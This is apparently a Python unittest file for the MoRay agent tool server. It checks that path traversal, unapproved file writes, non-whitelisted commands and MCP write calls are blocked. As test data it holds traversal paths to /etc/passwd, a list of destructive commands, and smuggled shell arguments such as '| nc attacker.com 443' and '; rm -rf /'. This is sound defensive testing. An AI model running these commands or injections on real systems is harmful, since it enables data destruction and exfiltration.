"""
MoRay 安全机制自动化测试脚本
============================
使用 Python 自带的 unittest，零额外依赖。
测试范围：七层路径防护 / 副作用审批 / 命令白名单 / MCP 安全隔离

运行方式：双击 run_test.bat，或在命令行执行 python test_security.py
"""

import os
import sys
import unittest
from pathlib import Path

# 确保能导入 server.app 模块
PROJECT_ROOT = Path(__file__).resolve().parent
sys.path.insert(0, str(PROJECT_ROOT))

# 设置测试专用的工作区和数据库（不污染真实数据）
TEST_WORKSPACE = PROJECT_ROOT / "test_workspace"
TEST_DB = PROJECT_ROOT / "test_security.db"

os.environ["MORAY_WORKSPACE"] = str(TEST_WORKSPACE)
os.environ["MORAY_DB"] = str(TEST_DB)

# 在导入项目模块前设置测试环境
TEST_WORKSPACE.mkdir(exist_ok=True)

from server.app import agent_tools, mcp_server, config, db


class TestPathSecurity(unittest.TestCase):
    """测试用例 1：路径越界拦截"""

    def setUp(self):
        """每个测试前清理环境"""
        self.workspace = TEST_WORKSPACE
        self.workspace.mkdir(exist_ok=True)

    def test_relative_path_escape_blocked(self):
        """测试：../../../windows/win.ini 越界读取必须被拦截"""
        dangerous_paths = [
            "../../../windows/win.ini",
            "../../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\cmd.exe",
            "subdir/../../../secret.txt",
        ]
        for path in dangerous_paths:
            with self.assertRaises(agent_tools.SafeError,
                                   msg=f"路径 {path} 应该被拦截，但没有抛出异常"):
                agent_tools._safe_path(path)

    def test_absolute_path_blocked(self):
        """测试：绝对路径必须被拒绝"""
        absolute_paths = [
            "C:/Windows/System32/drivers/etc/hosts",
            "D:/important/data.txt",
            "/etc/passwd",
            "\\\\server\\share\\file.txt",
        ]
        for path in absolute_paths:
            with self.assertRaises(agent_tools.SafeError,
                                   msg=f"绝对路径 {path} 应该被拒绝"):
                agent_tools._safe_path(path)

    def test_reserved_name_blocked(self):
        """测试：Windows 保留设备名必须被拒绝"""
        reserved_names = ["CON", "NUL", "PRN", "AUX", "COM1", "LPT1"]
        for name in reserved_names:
            with self.assertRaises(agent_tools.SafeError,
                                   msg=f"保留名 {name} 应该被拒绝"):
                agent_tools._safe_path(name + ".txt")

    def test_safe_relative_path_allowed(self):
        """测试：正常相对路径应该被放行"""
        safe_paths = [
            "hello.txt",
            "subdir/hello.txt",
            "docs/readme.md",
        ]
        for path in safe_paths:
            try:
                result = agent_tools._safe_path(path)
                self.assertTrue(str(result).startswith(str(self.workspace)),
                                f"安全路径 {path} 解析后应该在工作区内")
            except agent_tools.SafeError:
                self.fail(f"正常路径 {path} 不应该被拒绝")


class TestSideEffectApproval(unittest.TestCase):
    """测试用例 2：副作用工具审批机制"""

    def test_write_file_needs_approval(self):
        """测试：未审批调用 write_file 必须返回 needsApproval，绝不执行"""
        payload, status = agent_tools._execute_tool_internal(
            name="write_file",
            args={"path": "test.txt", "content": "hacked"},
            approved=False,  # 关键：未审批
            decision="",
            source="test"
        )
        self.assertEqual(status, 200, "HTTP 状态码应该是 200")
        self.assertTrue(payload.get("needsApproval"),
                        "未审批的 write_file 必须返回 needsApproval=True")
        self.assertNotIn("data", payload,
                         "未审批时绝不应该返回执行结果")

        # 验证文件确实没有被写入
        target = TEST_WORKSPACE / "test.txt"
        self.assertFalse(target.exists(),
                         "未审批的 write_file 绝对不能写入文件！")

    def test_create_file_needs_approval(self):
        """测试：未审批调用 create_file 必须返回 needsApproval"""
        payload, status = agent_tools._execute_tool_internal(
            name="create_file",
            args={"path": "new_file.txt", "content": "test"},
            approved=False,
            decision="",
            source="test"
        )
        self.assertTrue(payload.get("needsApproval"),
                        "未审批的 create_file 必须返回 needsApproval=True")

    def test_edit_file_needs_approval(self):
        """测试：未审批调用 edit_file 必须返回 needsApproval"""
        payload, status = agent_tools._execute_tool_internal(
            name="edit_file",
            args={"path": "any.txt", "old_str": "a", "new_str": "b"},
            approved=False,
            decision="",
            source="test"
        )
        self.assertTrue(payload.get("needsApproval"),
                        "未审批的 edit_file 必须返回 needsApproval=True")

    def test_read_file_no_approval_needed(self):
        """测试：只读工具不需要审批，应该直接执行"""
        # 先创建一个测试文件
        test_file = TEST_WORKSPACE / "readable.txt"
        test_file.write_text("hello world", encoding="utf-8")

        payload, status = agent_tools._execute_tool_internal(
            name="read_file",
            args={"path": "readable.txt"},
            approved=False,  # 只读工具，不需要审批
            decision="",
            source="test"
        )
        self.assertEqual(status, 200)
        self.assertNotIn("needsApproval", payload,
                         "只读工具不应该返回 needsApproval")
        self.assertIn("data", payload,
                      "只读工具应该直接返回执行结果")


class TestCommandWhitelist(unittest.TestCase):
    """测试用例 3：命令白名单拦截"""

    def test_dangerous_command_blocked(self):
        """测试：rm -rf / 等危险命令必须被拒绝"""
        dangerous_commands = [
            "rm",
            "del",
            "format",
            "shutdown",
            "reboot",
            "powershell",
            "cmd",
            "bash",
        ]
        for cmd in dangerous_commands:
            payload, status = agent_tools._execute_tool_internal(
                name="run_command",
                args={"command": cmd, "args": []},
                approved=True,  # 即使审批了，命令本身也不在白名单
                decision="",
                source="test"
            )
            self.assertFalse(payload.get("ok", True),
                             f"危险命令 {cmd} 必须被拒绝")
            self.assertIn("拒绝", str(payload.get("message", "")),
                          f"危险命令 {cmd} 应该返回拒绝信息")

    def test_shell_metacharacters_blocked(self):
        """测试：shell 元字符必须被拒绝"""
        # git 是白名单命令，但参数不能含元字符
        dangerous_args = [
            ["status", ";", "rm", "-rf", "/"],
            ["log", "|", "nc", "attacker.com", "443"],
            ["diff", ">", "/etc/passwd"],
        ]
        for args in dangerous_args:
            payload, status = agent_tools._execute_tool_internal(
                name="run_command",
                args={"command": "git", "args": args},
                approved=True,
                decision="",
                source="test"
            )
            self.assertFalse(payload.get("ok", True),
                             f"含元字符的参数 {args} 必须被拒绝")

    def test_whitelisted_command_allowed(self):
        """测试：白名单内的命令应该被放行"""
        # git status 是白名单命令
        payload, status = agent_tools._execute_tool_internal(
            name="run_command",
            args={"command": "git", "args": ["status"]},
            approved=True,
            decision="",
            source="test"
        )
        # 可能因为测试目录不是 git 仓库而报错，但不应该是"不在白名单"
        message = str(payload.get("message", ""))
        self.assertNotIn("不在只读白名单", message,
                         "git status 应该在白名单内，不应该被拒绝为不在白名单")


class TestMCPSecurity(unittest.TestCase):
    """测试用例 4：MCP 安全隔离"""

    def test_mcp_side_effect_blocked_by_whitelist(self):
        """测试：MCP 调用 write_file 必须被白名单拒绝"""
        # 模拟 MCP 的 tools/call 请求
        params = {
            "name": "write_file",
            "arguments": {
                "path": "mcp_hack.txt",
                "content": "this should never be written"
            }
        }
        result = mcp_server._call_tool(12345, params)

        # 验证返回的是 MCP 错误结果
        self.assertIn("result", result, "MCP 返回应该包含 result 字段")
        result_data = result["result"]
        self.assertTrue(result_data.get("isError"),
                        "MCP 调用 write_file 必须返回 isError=True")

        # 验证文件确实没有被写入
        target = TEST_WORKSPACE / "mcp_hack.txt"
        self.assertFalse(target.exists(),
                         "MCP 白名单拒绝后，文件绝对不能被写入！")

    def test_mcp_unknown_tool_rejected(self):
        """测试：MCP 调用未知工具必须被拒绝"""
        params = {
            "name": "rm_rf_slash",
            "arguments": {}
        }
        result = mcp_server._call_tool(12346, params)

        # 未知工具应该返回 JSON-RPC 错误
        self.assertIn("error", result, "未知工具应该返回 error")

    def test_mcp_readonly_tool_allowed(self):
        """测试：MCP 调用只读工具应该被放行"""
        params = {
            "name": "system_info",
            "arguments": {}
        }
        result = mcp_server._call_tool(12347, params)

        # 只读工具应该成功返回（不抛 isError）
        self.assertIn("result", result, "只读工具应该成功返回")
        result_data = result["result"]
        self.assertFalse(result_data.get("isError"),
                         "只读工具不应该返回 isError")
        # 应该有 content 字段
        self.assertIn("content", result_data, "返回应该包含 content")


class TestIntegration(unittest.TestCase):
    """集成测试：端到端安全流程"""

    def test_denied_decision_never_executes(self):
        """测试：客户端拒绝上报时，即使是只读工具也绝不执行"""
        payload, status = agent_tools._execute_tool_internal(
            name="list_directory",
            args={"path": "."},
            approved=False,
            decision="denied",  # 关键：客户端明确拒绝
            source="test"
        )
        self.assertEqual(status, 200)
        self.assertTrue(payload.get("data", {}).get("denied"),
                        "decision=denied 应该返回 denied=True")
        self.assertNotIn("entries", str(payload),
                         "客户端拒绝时绝不应该执行工具")

    def test_unknown_tool_rejected(self):
        """测试：调用不存在的工具必须被拒绝"""
        payload, status = agent_tools._execute_tool_internal(
            name="not_a_real_tool",
            args={},
            approved=True,
            decision="",
            source="test"
        )
        self.assertEqual(status, 400, "未知工具应该返回 400")
        self.assertFalse(payload.get("ok"), "未知工具应该返回 ok=False")


def run_tests():
    """运行所有测试"""
    print("=" * 60)
    print("MoRay 安全机制自动化测试")
    print("=" * 60)
    print(f"工作区: {TEST_WORKSPACE}")
    print(f"数据库: {TEST_DB}")
    print("=" * 60)
    print()

    # 创建测试套件
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()

    # 添加所有测试类
    suite.addTests(loader.loadTestsFromTestCase(TestPathSecurity))
    suite.addTests(loader.loadTestsFromTestCase(TestSideEffectApproval))
    suite.addTests(loader.loadTestsFromTestCase(TestCommandWhitelist))
    suite.addTests(loader.loadTestsFromTestCase(TestMCPSecurity))
    suite.addTests(loader.loadTestsFromTestCase(TestIntegration))

    # 运行测试
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)

    # 打印总结
    print()
    print("=" * 60)
    if result.wasSuccessful():
        print(f"✅ 全部 {result.testsRun} 项测试通过！安全机制完好。")
    else:
        print(f"❌ 测试失败！共 {result.testsRun} 项，"
              f"失败 {len(result.failures)} 项，错误 {len(result.errors)} 项")
        if result.failures:
            print("\n失败的测试：")
            for test, traceback in result.failures:
                print(f"  - {test}")
        if result.errors:
            print("\n错误的测试：")
            for test, traceback in result.errors:
                print(f"  - {test}")
    print("=" * 60)

    return result.wasSuccessful()


if __name__ == "__main__":
    success = run_tests()
    sys.exit(0 if success else 1)
